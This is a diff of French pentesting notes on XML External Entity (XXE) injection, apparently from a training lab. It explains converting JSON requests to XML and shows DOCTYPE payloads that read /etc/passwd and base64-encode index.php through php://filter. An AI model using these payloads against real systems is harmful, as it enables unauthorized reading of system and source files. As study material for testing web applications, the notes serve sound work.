@@ -46,14 +46,10 @@ Si `Inlane Freight` est affiché alors vulnérable.
 La requête peut être faite en JSON mais accepte XML. Transformer alors en XML [online tool](https://www.convertjson.com/json-to-xml.htm)
 
 ## Lecture
+Certains charactères ne sont pas permis dans les fichiers `<`/`>`/`&`. utiliser divers filtres PHP
 ```xml
 <!DOCTYPE email [
   <!ENTITY company SYSTEM "file:///etc/passwd">
-]>
-```
-Certains charactères ne sont pas permis dans les fichiers `<`/`>`/`&`. utiliser divers filtres PHP.
-```xml
-<!DOCTYPE email [
   <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
 ]>
 ```
